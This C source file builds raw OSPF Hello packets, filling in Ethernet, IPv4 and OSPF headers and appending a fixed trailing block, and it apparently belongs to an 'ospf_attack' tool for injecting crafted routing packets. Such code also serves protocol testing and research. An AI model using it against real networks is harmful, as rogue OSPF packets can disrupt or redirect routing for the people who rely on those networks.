#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>

#include "ospf_attack.h"
#include "ospf.h"
#include "checksum.h"

int build_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, unsigned char *dest_mac, char *dest_ip) {
  // Ethernet header
  struct ether_header *eth_header;
  eth_header = (struct ether_header *) &buffer[0];
  memcpy(eth_header->ether_dhost, dest_mac, MAC_ADDR_LEN);
  memcpy(eth_header->ether_shost, local_mac, MAC_ADDR_LEN);
  eth_header->ether_type = htons(0X800);

  // IP header
  struct ip *ip_header;
  ip_header = (struct ip *) &buffer[sizeof(struct ether_header)];
  ip_header->ip_hl = 0X5; //sizeof(ip_header);
  ip_header->ip_v = 4;
  ip_header->ip_tos = 0xc0;
  ip_header->ip_len = htons(sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_hello)+12);//0X2800; //sizeof(struct ip);
  ip_header->ip_id = htons((int)(rand()/(((double)RAND_MAX + 1)/14095)));
  ip_header->ip_off = 0;
  ip_header->ip_ttl = 1;
  ip_header->ip_p = PROTO_OSPF;
  ip_header->ip_sum = 0X0000; 
  ip_header->ip_src.s_addr = inet_addr(local_ip);
  ip_header->ip_dst.s_addr = inet_addr(dest_ip);
  ip_header->ip_sum = in_cksum((unsigned short*)ip_header, sizeof(struct ip));
  int swap = build_hello_header_ospf(buffer, local_ip, dest_ip);
  
  int packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
  
  buffer[packet_len] = 0xff;
  buffer[packet_len+1] = 0xf6;
  buffer[packet_len+2] = 0x00;
  buffer[packet_len+3] = 0x03;
  buffer[packet_len+4] = 0x00;
  buffer[packet_len+5] = 0x01;
  buffer[packet_len+6] = 0x00;
  buffer[packet_len+7] = 0x04;
  buffer[packet_len+8] = 0x00;
  buffer[packet_len+9] = 0x00;
  buffer[packet_len+10] = 0x00;
  buffer[packet_len+11] = 0x01;
  
  return packet_len + 12;
}
